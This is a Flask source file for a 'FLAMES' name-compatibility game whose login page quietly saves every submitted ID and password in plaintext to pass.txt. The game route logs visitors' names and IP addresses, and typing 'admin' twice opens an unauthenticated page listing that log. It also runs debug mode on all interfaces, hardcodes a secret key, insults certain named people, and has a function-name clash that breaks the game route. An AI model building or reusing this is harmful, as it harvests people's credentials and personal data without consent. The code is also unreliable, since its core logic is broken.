from flask import Flask, request, render_template, redirect, url_for
from flamesFinder.flames import flames
from datetime import datetime

app = Flask(__name__)
app.config["SECRET_KEY"] = "ThisIsMe"
first_name = ""
second_name = ""
exceptions = [
    "iniyan",
    "vignesh",
    "anees",
    "malar",
    "vinayagam",
    "malar vizhi",
    "malarvizhi",
]

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        id = request.form.get("id")
        password = request.form.get("pass")
        with open("pass.txt", "a") as file:
            file.writelines(f"\nid : {id} pass: {password}")
            file.close()
        print(id, password)
        if password == "" or id == "":
            return redirect("/")
        return redirect(f"/l")
    return render_template("login.html")
@app.route("/l")
def load():
    return render_template("load.html")
@app.route("/flames", methods=["GET", "POST"])
def flames():
    if request.method == "POST":
        first_name = request.form.get("fname").lower()
        second_name = request.form.get("sname").lower()
        if first_name != second_name:
            status = flames(first_name, second_name)
            emoji = status.split(" ")
            status = emoji[0]
        if first_name == "admin" and second_name == "admin":
            return redirect("/admin")

        else:
            if first_name not in exceptions and second_name not in exceptions:
                with open("./info.txt", "a") as f:
                    f.write(
                        f"\nuser[{request.environ['REMOTE_ADDR']}][{datetime.now()}]\n  first name : {first_name} second_name : {second_name}  result : {status[0]}"
                    )
                    f.close()
            else:
                status = "Fuck you"
                emoji = "🖕🖕🖕"
            return render_template(
                "result.html",
                status=status,
                emoji=emoji[1],
                first_name=first_name,
                second_name=second_name,
            )
    return render_template("index.html")


@app.route("/admin")
def admin():
    file = "./info.txt"
    with open(file, "r") as f:
        file = f.readlines()
        f.close()

    return render_template("admin.html", file=file)




app.run(debug=True, host="0.0.0.0")
